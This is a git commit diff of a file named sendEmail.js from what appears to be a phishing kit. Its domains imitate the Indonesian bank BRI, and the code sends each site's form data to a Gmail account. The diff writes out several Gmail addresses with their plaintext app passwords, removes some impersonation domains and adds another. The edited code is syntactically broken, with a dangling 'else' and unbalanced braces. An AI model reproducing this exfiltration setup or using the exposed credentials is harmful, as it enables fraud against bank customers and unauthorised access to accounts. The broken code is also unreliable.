b87393e14c0a3505ccbff8c83961aca84a562995
tesweb24 <115171866+tesweb24@users.noreply.github.com>
2022-10-18 14:46:35 +0700

    Update sendEmail.js

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -6,29 +6,13 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
+    
+     if (url == 'bifast-bri.herokuapp.com'){
 
-    if(url == 'bri-promo.site'){
-
-        email = 'orbitorbit799@gmail.com';
-        pass = 'ahghpmbdwokimqim';
-
-    } else if (url == 'bri-promo.herokuapp.com') {
-        
-        email = 'hibrahimshaleh@gmail.com';
-        pass = 'bfaawtyurzhbqjkl';
-
-    } else if(url == 'bri-pelayanan.herokuapp.com'){
-        email = 'pukiayam5123@gmail.com';
-        pass = 'joyxbannkfmypmzx';
-
-    } else if(url == 'bri-customerservice.xyz'){
-        email = 'spacediamond95@gmail.com';
-        pass = 'gkpahtwroxntldgs';
-
-    }
-    else {
-        email = 'bripembukaanrekening@gmail.com';
-        pass = 'nocpaagwmdvyyoin';
+       email = 'appanjay717@gmail.com'
+       pass = 'keyumxdlhcjkbrip'
+    }else
+    
     }
         
         try {
